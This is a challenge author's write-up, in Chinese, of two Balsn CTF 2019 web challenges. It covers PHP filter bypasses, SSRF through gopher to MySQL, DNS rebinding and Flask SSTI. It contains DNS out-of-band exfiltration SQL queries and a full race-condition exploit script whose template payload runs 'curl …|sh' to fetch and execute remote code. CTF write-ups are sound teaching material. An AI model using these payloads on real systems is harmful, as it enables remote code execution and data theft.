# Balsn CTF 2019 

這場因為太忙，只隨便出了兩題簡單的 Web 題 (相對於其他人的題目...)

# Warmup

- Difficulty: ★★
- Solved: 5 / 720
- Tag: PHP, SSRF, MySQL, Windows

## Description

Baby PHP challenge again.

![](https://i.imgur.com/jIk1rJT.jpg)

[Link](http://warmup.balsnctf.com)


## Source Code

- [Warmup](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2019/Warmup/index.php)

## Solution

這題是由一堆簡單又老梗的小技巧組成的

有點意外大部分人都不知道這些CTF常見老梗

原本預期，一般有在定期打CTF的Web手，解題時間應該要在30分鐘~1小時內...

### Step 1


由於這題原始碼混淆過，難以閱讀

所以第一步必須先整理一下原始碼，變成人可以看的樣子


```php
<?php
    // This is the meme image location
    $secret = base64_decode(str_rot13("CTygMlOmpz"."Z9VaSkYzcjMJpvCt=="));

    highlight_file(__FILE__);

    include("config.php");
    
    $op = @$_GET['op'];
    
    if(@strlen($op) < 3 && @($op + 8) < 'A_A') {
    
        $_ = @$_GET['Σ>―(#°ω°#)♡→'];
    
        if( preg_match('/[\x00-!\'0-9"`&$.,|^[{_zdxfegavpos\x7F]+/i',$_) || @strlen(count_chars(strtolower($_), 0x3)) > 0xd || @strlen($_) > 19 )
            exit($secret);
        
        $ch = curl_init());
        @curl_setopt($ch, CURLOPT_URL, 
                str_replace("%33%33%61", ">__<", 
                str_replace("%63%3a", "WTF", str_replace("633a", ":)", 
                str_repLace("433a", ":(", 
                str_replace("\x63:", "ggininder", 
                strtolower(
                    eval("return $_;")
                ))))))
        );
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        @curl_setopt($ch, CURLOPT_TIMEOUT, 1);
        @curl_EXEC($ch);
        
    } else {
    
        if(@stRLEn($op) < 4 && @($op + 78) < 'A__A') {
        
            // There is a invisible character here. (\xe2\x81\xa3)
            $_ = @$_GET['⁣'];
        
            if((strtolower(substr($_, -4)) === '.php') || 
               (strtolower(substr($_, -4)) === 'php.') || 
               (stripos($_, "\"") !== FALSE) || 
               (stripos($_, "\x3e") !== FALSE) || 
               (stripos($_,"\x3c") !== FALSE) || 
               (stripos(strtolower($_), "amp") !== FALSE))
                    die($secret);
        
            if(stripos($_, "..") !== FALSE)
                die($secret);
            
            if(stripos($_, "\x24") !== FALSE)
                die($secret);
            
            print_r(substr(@file_get_contents($_), 0, 155));
            
        } else {
        
            die($secret);

            // It is useless, because there is a die function before it. :D
            system($_GET[0x9487945]);
            
        }
    }
```

<br>

### Step 2

接著，很明顯，`config.php`是一個很誘人的目標

有兩種方法可以讀出來:

1. 使用 `file_get_contents()` (預期)
2. 使用 `eval()` (非預期)

<br>

**Method 0x1**

`if(@stRLEn($op) < 4 && @($op + 78) < 'A__A')`

在這個if條件下，你可以簡單使用`op=-99`來繞過

接著，會有一個看起來像是空字串的`$_GET`輸入:

`$_ = @$_GET['⁣'];`

但其實這個`$_GET`的參數是`\xE2\x81\xA3`，是一個不可見字元

<br>

我們的目標是去讀`config.php`，但是後面還有一些針對檔名的檢查要通過

例如，我們不能使用`.php`, `php.`等後綴當作檔名，也不能使用`"`, `>`, `<`, `amp`, `$`, `..`等字串

要繞過這些檢查，我們只需要簡單加上一個空白(0x20)在檔名結尾就行

`config.php[SPACE]`

因為這題Server是Windows系統，所以路徑處理會有一些神奇的特性

<br>

但如果你試著用這招去讀`config.php`的原始碼，例如:

`http://warmup.balsnctf.com/?op=-99&%E2%81%A3=config.php%20`

你會發現，你只能讀出部分的原始碼:

```php
<?php
    // ***********************************
    // THIS IS THE CONFIG OF THE MYSQL DB
    // ***********************************
    $host = "loca
```

因為`file_get_contents()`第三個參數是155，代表只讀155個Bytes

<br>

必須透過一些特殊的php wrapper，來增加我們能讀到的長度

對於壓縮長度來說，很容易能想到`php://filter/zlib.deflate`這個filter

使用 `zlib.deflate` 來壓縮內容，之後再用 `zlib.inflate` 解壓縮

Script:

```php
<?php
$a = file_get_contents("http://warmup.balsnctf.com/?op=-99&%E2%81%A3=php://filter/zlib.deflate/resource=config.php%20");
$idx = stripos($a, "</code>") + 7;
file_put_contents("/tmp/tmp", substr($a, $idx));

echo (file_get_contents("php://filter/zlib.inflate/resource=/tmp/tmp"));
```
    
讀出來的`config.php`:

```php
<?php
    // ***********************************
    // THIS IS THE CONFIG OF THE MYSQL DB
    // ***********************************
    $host = "localhost";
    $user = "admin";
    $pass = "";
    $port = 8787;
    // hint:flag-is-in-the-database XDDDDDDD
    // ====================================
```

<br>

**Method 0x2**

賽中發現有許多隊伍使用 `eval()` 這條路來讀 `config.php`

在`eval()`這條 if 分枝中，你的輸入 `$_` 會被放進 `eval("return $_;")`

但在這之前，還有一些嚴格的檢查:

```php
if( preg_match('/[\x00-!\'0-9"`&$.,|^[{_zdxfegavpos\x7F]+/i',$_) || @strlen(count_chars(strtolower($_), 0x3)) > 0xd || @strlen($_) > 19 )
    exit($secret);
```

不過我們可以使用 `~` NOT運算來繞過這些限制

例如: `~urldecode("%8D%9A%9E%9B%99%96%93%9A")` 就等同 `readfile`.

<br>

在 Windows 中，對於路徑正規上，有許多神奇的萬用字元

例如: 

`>` 會匹配一個任意字元 (就像 Linux 上的 `?`) 

`<` 會匹配零個或多個任意字元 (就像 Linux 上的 `*`)

(更多整理: [My-CTF-CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet#%E8%B7%AF%E5%BE%91%E6%AD%A3%E8%A6%8F%E5%8C%96))

最後, 結合 `~` 和 `<` 就能完整讀出 `config.php`:

`/?op=-9&Σ>―(%23°ω°%23)♡→=(~%8D%9A%9E%9B%99%96%93%9A)(~%9C%90%C3%C3)`

(以上的效果等同 `readfile("co<<")`)

<br>

### Step 3

從 `config.php` 的內容，可以知道 flag 在 MySQL Database中

所以我們下個目標，就是去請求後端 MySQL Server，並且讀出請求結果

由於我們已經知道使用者 `admin` 是空密碼，所以可以透過 `gopher://` 協議去做SSRF，對 MySQL Server 發送請求

<br>

但 gopher payload 太長了，還需要找一個方法能夠通過嚴格正規表達式和長度等限制

如果你試著把這些嚴格正規表達式限制和長度限制等規則，套在所以 PHP Function 上面的話

你會發現，能用的 Function 其實沒幾個，其中一個就是 `getenv()`

這個 function 會回傳你指定的 HTTP Header 的值

所以可以把 Gopher Payload 放在 HTTP Header 之中，來繞過這些限制

`(~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%AB)` (length: 18)

這等同 `getenv("HTTP_T")`.

<br>

### Step 4

現在，你已經有了一個 Blind SSRF!

對於構造 MySQL Protocol，可以使用一些現成工具，像 [Gopherus](https://github.com/tarunkant/Gopherus)

最後，你只需要把結果撈出就行，這裡可以使用 Time-based 或是 Out-of-band (DNS log) 等方法就能撈出結果

- `select load_file(concat("\\\\",table_name,".e222e6f24ba81a9b414f.d.zhack.ca/a")) from information_schema.tables where table_schema="ThisIsTheDbName";`
    - Output: `fl4ggg`
- `select load_file(concat("\\\\",column_name,".e222e6f24ba81a9b414f.d.zhack.ca/a")) from information_schema.columns where table_name="fl4ggg";`
    - Output: `the_flag_col`
- `select load_file(concat("\\\\",hex(the_flag_col),".e222e6f24ba81a9b414f.d.zhack.ca/a")) from ThisIsTheDbName.fl4ggg;`
    - Output: `42616C736E7B337A5F77316E643077735F7068705F6368346C7D`
    - hex to ascii: `Balsn{3z_w1nd0ws_php_ch4l}`

---

<br>

# 卍乂Oo韓國魚oO乂卍 (Koreanfish)


- Difficulty: ★
- Solved: 15 / 720
- Tag: PHP, DNS Rebinding, Flask, Race condition, SSTI, RCE

## Description

Taiwanese people love korean fish.

[Server Link](http://koreanfish.balsnctf.com/)

[Download](https://static.balsnctf.com/koreafish/d68fcc656a04423422ff162d9793606f2c5068904fced9087edc28efc411e7b7/koreafish-src.zip)

## Source Code

- [Koreanfish](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2019/Koreanfish/)

## Solution

這題直接給你 Source code，並且長度都很短

原本預期難度比 Warmup 高，只是忘記擋 302 Redirect，所以這題瞬間變水題 orz

<br>

### Step 1

第一步，很明顯要繞過 IP 限制，他只給我們訪問 `54.87.54.87`

事實上，這邊有很明顯的 DNS Rebinding 可以利用

```
$ip = @dns_get_record($res['host'], DNS_A)[0]['ip'];
...
$dev_ip = "54.87.54.87";
if($ip === $dev_ip) {
    $content = file_get_contents($dst);
```

`file_get_contents()` 會再去查詢DNS.

所以只要我們把 Domain 的 A record 設成 `54.87.54.87` 和 `127.0.0.1`

就有機會通過 IP 檢查，並同時請求 `127.0.0.1` 的服務

沒有 Domain 的小夥伴也別難過

你可以使用一些線上 DNS Rebinding 工具，像是 `rbndr.us`.

e.g. `36573657.7f000001.rbndr.us` 會對應到 `54.87.54.87` 或 `127.0.0.1`.

<br>

### Step 2

從 Dockerfile 中，可以看到，後端跑了一個簡單的 flask app

並且在 `/error_page` 有著很明顯的 SSTI 漏洞，其 `render_template_string()` 參數是可控的內容

<br>

如果 `error_status` 設成絕對路徑，`os.path.join()` 的回傳結果，就會忽略前面已有的內容，被整個覆蓋掉

e.g. `os.path.join("/var/www/flask", "error", "/etc/passwd")` 會回傳 `/etc/passwd`

<br>

但這邊最大的難題是，你沒辦法直接請求 flask 的 `/error_page`

因為前端 php 會去檢查你的請求路徑，是否包含 `korea` 字串:

`if(stripos($res['path'], "korea") === FALSE) die("Error");`

<br>

這裡有兩種方法可以繞過這個限制

<br>

**Method 0x1**

使用 302 Redirect 繞過!

只需透過 DNS Rebinding，讓其訪問你自己 Server 的 IP

接著把 `/korea` 路徑，重導向到 `127.0.0.1:5000/error_page?err=...`

(因為 `file_get_contents()` 是會 follow 302 重導向的)

<br>

**Method 0x2**

使用 Flask 的神奇特性繞過!

在 Flask app 中，`//korea/ping` 等同 `/ping`.

因此，使用 `//korea/error_page?err=....` 就能繞過限制

<br>

### Step 3

現在，我們能控制 `render_template_string()` 的內容，也相當於一個任意讀檔漏洞

但要做到 RCE，必須找一個能夠塞我們可控 Payload 的檔案

因為 Server 同時跑著 PHP，所以可以使用 `session.upload_progress` trick 來上傳 SSTI payload 到 session file 中

如果在 multipart POST data 中使用 `PHP_SESSION_UPLOAD_PROGRESS`，PHP 會直接啟用 Session (即便你沒有 `session_start()`)

(這裡的知識點，同 HITCON CTF 2018 - one line php challenge: [Link](https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html).)

(Note: 你的 payload 不能包含 `|`，因為這會破壞 PHP Session 的內容格式)

<br>

### Step 4

預設 `session.upload_progress.cleanup` 是 `On`，所以上傳的 SSTI payload 會在短時間被清空

OK! 讓我們去 Race condition 吧!

Exploit script:

```python
import sys
import string
import requests
from base64 import b64encode
from random import sample, randint
from multiprocessing.dummy import Pool as ThreadPool

HOST = 'http://koreanfish4.balsnctf.com/index.php'
sess_name = 'iamkaibro'

headers = {
    'Connection': 'close', 
    'Cookie': 'PHPSESSID=' + sess_name
}

payload = """
{% for c in []['__class__']['__base__']['__subclasses__']() %}
{% if c['__name__'] == 'catch_warnings' %}
{% for b in c['__init__']['__globals__']['values']() %}
{% if b['__class__']=={}['__class__'] %}
{% if 'eval' in b['keys']() %}
{% if b['eval']('__import__("os")\\x2epopen("curl kaibro\\x2etw/yy\\x7csh")') %}{% endif %}
{% endif %}
{% endif %}
{% endfor %}
{% endif %}
{% endfor %}
"""

def runner1(i):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': payload
    }
    while 1:
        fp = open('/etc/passwd', 'rb')
        r = requests.post(HOST, files={'f': fp}, data=data, headers=headers)
        fp.close()

def runner2(i):
    filename = '/var/lib/php/sessions/sess_' + sess_name
    # print filename
    while 1:
        url = '{}?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http://36573657.7f000001.rbndr.us:5000//korea/error_page%3Ferr={}'.format(HOST, filename)
        r = requests.get(url, headers=headers)
        c = r.content
        print [c]

if sys.argv[1] == '1':
    runner = runner1
else:
    runner = runner2

pool = ThreadPool(32)
result = pool.map_async( runner, range(32) ).get(0xffff)
```

對於繞過 SSTI 限制的細節，可以參考我的CheatSheet: [Link](https://github.com/w181496/Web-CTF-Cheatsheet#flaskjinja2) 

